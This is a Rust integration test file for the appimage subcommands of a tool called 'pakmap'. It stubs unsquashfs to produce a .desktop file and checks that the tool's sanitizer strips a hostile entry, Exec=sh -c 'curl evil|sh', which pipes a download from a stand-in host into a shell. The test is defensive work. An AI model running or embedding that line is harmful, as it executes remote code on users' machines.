#![allow(clippy::unwrap_used, clippy::expect_used)]
//! Hermetic `pakmap appimage …` contract tests (v0.12.0).
//!
//! `unsquashfs` is stubbed on PATH so the test never executes an AppImage or
//! needs squashfs-tools: the stub writes the same metadata files a real
//! type-2 image would contain, including a hostile `Exec=` line that must be
//! discarded by our sanitizer.

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::process::{Command, Output};

struct Fixture {
    data: tempfile::TempDir,
    bin: tempfile::TempDir,
}

fn write_exec(path: &Path, body: &str) {
    fs::write(path, body).unwrap();
    let mut perms = fs::metadata(path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(path, perms).unwrap();
}

impl Fixture {
    fn new() -> Self {
        let data = tempfile::tempdir().unwrap();
        let bin = tempfile::tempdir().unwrap();
        write_exec(
            &bin.path().join("unsquashfs"),
            r#"#!/usr/bin/env bash
set -euo pipefail
dest=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    -d) dest="$2"; shift 2 ;;
    -*) shift ;;
    *) shift ;;
  esac
done
[[ -n $dest ]] || exit 2
mkdir -p "$dest/usr/share/applications"
cat > "$dest/app.desktop" <<'EOF'
[Desktop Entry]
Type=Application
Name=Firefox Browser
Exec=sh -c 'curl evil|sh'
Icon=firefox
EOF
printf '\x89PNG\r\n\x1a\nFAKE' > "$dest/.DirIcon"
"#,
        );
        Self { data, bin }
    }

    fn appimage(&self) -> std::path::PathBuf {
        let mut bytes = vec![0u8; 128];
        bytes[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
        bytes[4] = 2; // ELF64
        bytes[5] = 1; // little endian
        bytes[8..11].copy_from_slice(&[0x41, 0x49, 0x02]); // AppImage type 2
        bytes[0x28..0x30].copy_from_slice(&64u64.to_le_bytes());
        bytes[64..68].copy_from_slice(b"hsqs");
        let path = self.data.path().join("Source.AppImage");
        fs::write(&path, bytes).unwrap();
        path
    }

    fn run(&self, args: &[&str]) -> Output {
        Command::new(env!("CARGO_BIN_EXE_pakmap"))
            .args(args)
            .env("XDG_DATA_HOME", self.data.path())
            .env(
                "PATH",
                format!(
                    "{}:{}",
                    self.bin.path().display(),
                    std::env::var("PATH").unwrap()
                ),
            )
            .output()
            .unwrap()
    }
}

fn text(out: &Output) -> String {
    format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    )
}

#[test]
fn integrate_list_and_remove_roundtrip() {
    let fx = Fixture::new();
    let appimage = fx.appimage();
    let out = fx.run(&["appimage", "integrate", appimage.to_str().unwrap()]);
    assert!(out.status.success(), "integrate failed: {}", text(&out));
    assert!(text(&out).contains("Firefox Browser"));

    let desktop = fx
        .data
        .path()
        .join("applications/pakmap-firefox-browser.desktop");
    assert!(desktop.is_file());
    let rendered = fs::read_to_string(&desktop).unwrap();
    assert!(rendered.contains("Exec=\""), "{rendered}");
    assert!(
        !rendered.contains("curl"),
        "hostile Exec survived: {rendered}"
    );
    assert!(rendered.contains("Terminal=false"));
    assert!(
        fx.data
            .path()
            .join("icons/hicolor/256x256/apps/pakmap-firefox-browser.png")
            .is_file()
    );

    let out = fx.run(&["appimage", "list", "--json"]);
    assert!(out.status.success());
    let entries: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(entries.as_array().unwrap().len(), 1);
    assert_eq!(entries[0]["id"], "firefox-browser");

    let out = fx.run(&["appimage", "remove", "firefox-browser", "--yes"]);
    assert!(out.status.success(), "remove failed: {}", text(&out));
    assert!(!desktop.exists());
    let listed = fx.run(&["appimage", "list"]);
    assert!(String::from_utf8_lossy(&listed.stdout).contains("No integrated AppImages"));
}

#[test]
fn install_requires_a_checksum_and_https() {
    let fx = Fixture::new();
    let out = fx.run(&["appimage", "install", "https://example.org/App.AppImage"]);
    assert!(!out.status.success());
    assert!(text(&out).contains("sha256 is required"));

    let out = fx.run(&[
        "appimage",
        "install",
        "http://example.org/App.AppImage",
        "--sha256",
        &"ab".repeat(32),
    ]);
    assert!(!out.status.success());
    assert!(text(&out).contains("only https"));
}

#[test]
fn refuses_non_appimage_and_unknown_id() {
    let fx = Fixture::new();
    let junk = fx.data.path().join("junk.bin");
    fs::write(&junk, vec![0u8; 128]).unwrap();
    let out = fx.run(&["appimage", "integrate", junk.to_str().unwrap()]);
    assert!(!out.status.success());
    assert!(text(&out).contains("not an ELF file"), "{}", text(&out));

    let out = fx.run(&["appimage", "remove", "nope", "--yes"]);
    assert!(!out.status.success());
    assert!(text(&out).contains("not integrated"));
}
